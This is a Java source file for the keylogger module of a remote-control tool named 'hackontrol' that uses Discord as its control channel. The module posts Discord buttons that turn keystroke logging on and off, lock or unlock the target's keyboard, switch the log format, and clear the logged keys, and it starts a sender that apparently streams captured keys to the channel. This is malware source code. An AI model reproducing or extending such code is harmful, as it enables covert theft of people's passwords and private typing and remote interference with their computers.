package com.khopan.hackontrol.module.keylogger;

import java.util.List;

import com.khopan.hackontrol.KeyboardHandler;
import com.khopan.hackontrol.module.Module;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.service.interaction.ButtonManager;
import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.service.interaction.context.ButtonContext;
import com.khopan.hackontrol.service.interaction.context.Question;
import com.khopan.hackontrol.service.interaction.context.Question.QuestionType;
import com.khopan.hackontrol.utils.HackontrolMessage;

import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageHistory;
import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;

public class KeyLoggerModule extends Module {
	private static final String MODULE_NAME = "keylogger";

	static boolean RawKeyMode;

	private static final Button BUTTON_ENABLE          = ButtonManager.staticButton(ButtonType.SUCCESS, "Enable",          "enableKeyLogger");
	private static final Button BUTTON_DISABLE         = ButtonManager.staticButton(ButtonType.DANGER,  "Disable",         "disableKeyLogger");

	private static final Button BUTTON_LOCK_KEYBOARD   = ButtonManager.staticButton(ButtonType.SUCCESS, "Lock Keyboard",   "lockKeyboard");
	private static final Button BUTTON_UNLOCK_KEYBOARD = ButtonManager.staticButton(ButtonType.DANGER,  "Unlock Keyboard", "unlockKeyboard");

	private static final Button BUTTON_RAW_KEY_MODE    = ButtonManager.staticButton(ButtonType.SUCCESS, "Raw Key Mode",    "rawKeyMode");
	private static final Button BUTTON_TEXT_MODE       = ButtonManager.staticButton(ButtonType.SUCCESS, "Text Mode",       "textMode");

	private static final Button BUTTON_CLEAR           = ButtonManager.staticButton(ButtonType.DANGER,  "Clear",           "keyloggerClear");

	@Override
	public String getName() {
		return KeyLoggerModule.MODULE_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		/*registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_ENABLE,          context -> this.buttonEnable(context, true));
		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_DISABLE,         context -> this.buttonEnable(context, false));
		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_LOCK_KEYBOARD,   context -> this.buttonLock(context, true));
		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_UNLOCK_KEYBOARD, context -> this.buttonLock(context, false));
		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_RAW_KEY_MODE,    context -> this.buttonRawKeyMode(context, true));
		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_TEXT_MODE,       context -> this.buttonRawKeyMode(context, false));
		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_CLEAR,           this :: buttonClear);*/
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(KeyLoggerModule.BUTTON_ENABLE, KeyLoggerModule.BUTTON_DISABLE), ActionRow.of(KeyLoggerModule.BUTTON_LOCK_KEYBOARD, KeyLoggerModule.BUTTON_UNLOCK_KEYBOARD), ActionRow.of(KeyLoggerModule.BUTTON_RAW_KEY_MODE, KeyLoggerModule.BUTTON_TEXT_MODE, KeyLoggerModule.BUTTON_CLEAR)).queue();
	}

	@Override
	public void postInitialize() {
		KeyLogSender.start(this.channel);
	}

	private void buttonEnable(ButtonContext context, boolean enable) {
		if(KeyboardHandler.Enable == enable) {
			HackontrolMessage.boldDeletable(context.reply(), "KeyLogger is already " + (enable ? "enabled" : "disabled"));
			return;
		}

		if(!enable) {
			Question.positive(context.reply(), "Are you sure you want to disable KeyLogger?", QuestionType.YES_NO, () -> KeyboardHandler.Enable = false);
			return;
		}

		KeyboardHandler.Enable = true;
		context.deferEdit().queue();
	}

	private void buttonLock(ButtonContext context, boolean lock) {
		if(KeyboardHandler.Block == lock) {
			HackontrolMessage.boldDeletable(context.reply(), "Keyboard is already " + (lock ? "locked" : "unlocked"));
			return;
		}

		if(!lock) {
			Question.positive(context.reply(), "Are you sure you want to unlock the keyboard?", QuestionType.YES_NO, () -> KeyboardHandler.Block = false);
			return;
		}

		KeyboardHandler.Block = true;
		context.deferEdit().queue();
	}

	private void buttonRawKeyMode(ButtonContext context, boolean rawKeyMode) {
		if(KeyLoggerModule.RawKeyMode == rawKeyMode) {
			HackontrolMessage.boldDeletable(context.reply(), (rawKeyMode ? "Raw key" : "Text") + " mode is already enabled");
			return;
		}

		KeyLoggerModule.RawKeyMode = rawKeyMode;
		context.deferEdit().queue();
	}

	private void buttonClear(ButtonContext context) {
		long identifier = context.getMessageIdLong();
		MessageChannel channel = context.getChannel();
		Question.positive(context.reply(), "Are you sure you want to clear the KeyLog information?", QuestionType.YES_NO, () -> MessageHistory.getHistoryFromBeginning(channel).queue(history -> {
			List<Message> list = history.getRetrievedHistory();

			for(int i = 0; i < list.size(); i++) {
				Message message = list.get(i);

				if(message.getIdLong() != identifier) {
					message.delete().queue();
				}
			}
		}));
	}
}
